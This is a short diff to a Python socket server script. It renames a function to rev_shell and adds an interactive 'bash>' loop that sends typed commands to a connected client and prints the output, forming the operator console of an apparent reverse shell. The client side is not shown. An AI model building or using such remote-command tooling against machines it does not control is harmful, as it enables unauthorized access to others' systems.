@@ -1,8 +1,7 @@
 import socket
   
   
-def send_command(conn, command):
-    data = input('bash>')
+def rev_shell(conn, data):
     conn.send(data.encode())
   
   
@@ -27,8 +26,17 @@ def basic_server():
     
         conn.send(data.encode())
     
-        if data == 'command':
-            send_command(conn, data)
+        if data == 'shell':
+            shell = True
+            while shell:
+                data = input('bash>')
+                
+                if data == "quit" or data == "close":
+                    rev_shell(conn, data)
+                    shell = False
+                else:
+                    rev_shell(conn, data)
+                    print(conn.recv(1024).decode())
     
     
 #    conn.close()
